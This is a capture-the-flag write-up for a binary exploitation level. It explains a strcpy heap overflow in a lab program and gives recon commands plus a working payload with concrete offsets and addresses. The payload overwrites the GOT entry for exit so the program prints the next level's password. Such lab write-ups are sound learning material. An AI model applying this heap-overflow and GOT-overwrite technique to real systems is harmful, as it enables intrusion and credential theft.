## LEVEL 7 — Exploitation guide

## Quick vulnerability summary

- `source.c` allocates two small `MyStruct` objects and two small 8-byte heap buffers for `s`:
	- `string_table1 = malloc(sizeof(MyStruct)); string_table1->s = malloc(8);`
	- `string_table2 = malloc(sizeof(MyStruct)); string_table2->s = malloc(8);`
- The program calls `strcpy(string_table1->s, argv[1])` and `strcpy(string_table2->s, argv[2])`.
	- Each `s` buffer is only 8 bytes but `strcpy` will copy any length. This is a classic heap overflow.
- Later the program opens `/home/user/level8/.pass` and calls `fgets(c, 68, _stream);` where `c` is a global buffer. The program then returns (which triggers process exit).

Why this is useful: by overflowing the first 8-byte heap chunk you can corrupt adjacent heap data (in particular, the contents of the second `MyStruct` instance). If you overwrite `string_table2->s` (the pointer) you can force the subsequent `strcpy(string_table2->s, argv[2])` to write to an arbitrary writable memory address. That allows you to overwrite Global Offset Table (GOT) entries (for example `exit`), function pointers, or other writable targets.

A common objective: overwrite the GOT entry for `exit` (or another function called when the program exits) with the address of the function `fucntion_m` (note the typo in the source). `fucntion_m` prints the global buffer `c`. Because the program later reads the password from the level8 `.pass` file into `c` before the process exit, calling `fucntion_m` at exit will print the password.

## How to discover required values (compile and inspect)

2. Find the address of `fucntion_m` (the function that prints `c`):

```bash
nm -C level7 | grep fucntion_m
# or
objdump -d level7 | grep -A1 fucntion_m
```

Record the returned address (call it FUNC_M_ADDR).

3. Find the GOT entry address for `exit` (or another function called at program termination):

```bash
readelf -r level7 | grep "exit@"
# or
objdump -R level7 | grep exit
```

Record the returned GOT address (call it EXIT_GOT_ADDR).

## SOLUTION

Use the following as a starting point. Replace placeholders:

- FUNC_M_ADDR  : address of `fucntion_m` (from nm/objdump)
- EXIT_GOT_ADDR: address of `exit` GOT entry (from readelf/objdump)
- PTR_OFFSET   : number of bytes between the start of `string_table1->s` and the `string_table2->s` pointer you need to overwrite.

```bash
./level7 $(python -c 'print("A"*PTR_OFFSET + "EXIT_GOT_ADDR_in_little_endian")') $(python -c 'print("FUNC_M_ADDR_in_little_endian")')
```

## USED parameters

`PTR_OFFSET` = `20`

`EXIT_GOT_ADDR_in_little_endian` = `\x28\x99\x04\x08`

`FUNC_M_ADDR_in_little_endian` = `\xf4\x84\x04\x08`
